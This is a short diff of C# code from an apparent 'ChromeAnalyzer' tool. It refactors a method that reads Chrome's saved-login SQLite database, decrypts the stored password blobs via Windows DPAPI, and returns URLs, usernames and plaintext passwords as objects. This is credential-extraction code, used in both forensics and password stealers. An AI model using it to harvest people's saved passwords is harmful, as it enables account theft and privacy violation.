@@ -21,20 +21,20 @@ namespace ChromeAnalyzer {
             client = new SQLite.Client(location);
         }
 
-        public List<string> getPasswords() {
-        //public List<PasswordDTO> getPasswords()
+        //public List<string> getPasswords() {
+        public List<PasswordDTO> getPasswords() { 
             if (queryResult == null) {
                 queryResult = client.select(QUERY);
                 WindowsBLOBDecipher.decipherQueryResultField("pass", queryResult);
             }
 
-            List<string> res = new List<string>();
-            //List<PasswordDTO> res = new List<PasswordDTO>();
+            //List<string> res = new List<string>();
+            List<PasswordDTO> res = new List<PasswordDTO>();
             foreach (DataRow r in queryResult.Rows) {
                 string pass = System.Text.Encoding.Default.GetString((byte[])r["pass"]);
-                res.Add("PASSWORD FROM: " + r["url"] + "\r\n\tUSERNAME: " + r["username"] + "\r\n\tPASSWORD: " + pass);
+                //res.Add("PASSWORD FROM: " + r["url"] + "\r\n\tUSERNAME: " + r["username"] + "\r\n\tPASSWORD: " + pass);
                 //TODO missing time
-                //res.Add(new PasswordDTO(string time, "Chrome", r["url"], r["username"], pass))
+                res.Add(new PasswordDTO("", "Chrome", "" + r["url"], "" + r["username"], pass));
             }
 
             return res;
